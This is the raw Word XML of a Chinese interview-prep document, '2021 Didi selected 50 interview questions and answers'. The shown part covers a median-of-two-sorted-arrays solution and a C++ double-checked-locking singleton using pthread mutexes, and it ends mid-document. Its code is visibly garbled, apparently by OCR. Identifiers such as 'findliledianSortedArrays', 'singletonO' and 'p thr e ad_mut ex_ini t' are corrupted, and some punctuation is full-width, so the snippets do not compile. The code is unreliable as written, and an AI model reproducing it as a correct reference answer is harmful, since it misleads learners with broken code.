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hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>202</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:bookmarkStart w:id="333" w:name="_GoBack"/>
      <w:bookmarkEnd w:id="333"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>年滴滴精选</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>50</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>面试题及答案</w:t>
      </w:r>
      <w:bookmarkEnd w:id="0"/>
      <w:bookmarkEnd w:id="1"/>
      <w:bookmarkEnd w:id="2"/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="9"/>
        <w:keepNext/>
        <w:keepLines/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="410"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="300" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="3" w:name="bookmark5"/>
      <w:bookmarkEnd w:id="3"/>
      <w:bookmarkStart w:id="4" w:name="bookmark4"/>
      <w:bookmarkStart w:id="5" w:name="bookmark3"/>
      <w:bookmarkStart w:id="6" w:name="bookmark6"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>寻找两个有序数组的中位数</w:t>
      </w:r>
      <w:bookmarkEnd w:id="4"/>
      <w:bookmarkEnd w:id="5"/>
      <w:bookmarkEnd w:id="6"/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1240" w:right="0" w:hanging="820"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">double findliledianSortedArrays (vectoi&lt;intnumsl, vector&lt;int&gt;&amp; nums2) { double ret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11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="420" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1240" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>vector&lt;double&gt; buff;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="60" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="1240" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>//</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>合并两个数组</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>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 xml:space="preserve">for (auto </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>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numsl)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1640" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>buff. push_back(e);</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 xml:space="preserve">for (auto a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>nums2)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="420" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1640" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>buff. push_back(a);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="60" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="1640" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>合并后的结果进行排序</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>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sort (buff. beginO, buff, end：));</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="420" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1240" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>int size3 = buff. size();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="60" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="1240" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>依取中位数</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="1240" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">if (size3 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-CN" w:eastAsia="zh-CN" w:bidi="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve">% </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>2 == 0)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="60" w:line="240" w:lineRule="auto"/>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640" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">ret = ((buff[size3 / 2] + buff[size3 / 2 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">1]) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">/ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>2);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="60" w:line="240" w:lineRule="auto"/>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240" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="13"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="6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640" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">ret = buff[size3 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">/ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>2];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="60" w:line="240" w:lineRule="auto"/>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240" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>return ret;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="13"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="42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w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="9"/>
        <w:keepNext/>
        <w:keepLines/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="410"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="420" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="7" w:name="bookmark9"/>
      <w:bookmarkEnd w:id="7"/>
      <w:bookmarkStart w:id="8" w:name="bookmark10"/>
      <w:bookmarkStart w:id="9" w:name="bookmark7"/>
      <w:bookmarkStart w:id="10" w:name="bookmark8"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>C</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>卄实现线程安全的单例模式</w:t>
      </w:r>
      <w:bookmarkEnd w:id="8"/>
      <w:bookmarkEnd w:id="9"/>
      <w:bookmarkEnd w:id="10"/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="60" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="380"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>懒汉模式：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="380"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>class singleton</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="60" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="38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en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>protected:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="120" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="820"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>singletonO</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240" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>p thr e ad_mut ex_ini t(&amp;mutex);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:line="210" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="420"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>private：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:line="210" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="820"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>static singleton* p;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:line="210" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="420"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>public：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:line="210" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="820"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>static pthread__mutex_t mutex;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="720" w:line="210" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="820"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>static singleton* initance();</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pthread_mutex_t singleton：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>mutex;</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singleton* singleton：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>p = NULL;</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singleton* singleton：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>initance()</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if (p == NULL)</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p thr e ad_mut ex_lo ck(&amp;mutex);</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if (p == NULL)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="1680" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>p = new singletonO ;</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p thr e ad_mut ex_unlo ck(&amp;mutex；;</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return p;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="480" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="420"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="9"/>
        <w:keepNext/>
        <w:keepLines/>
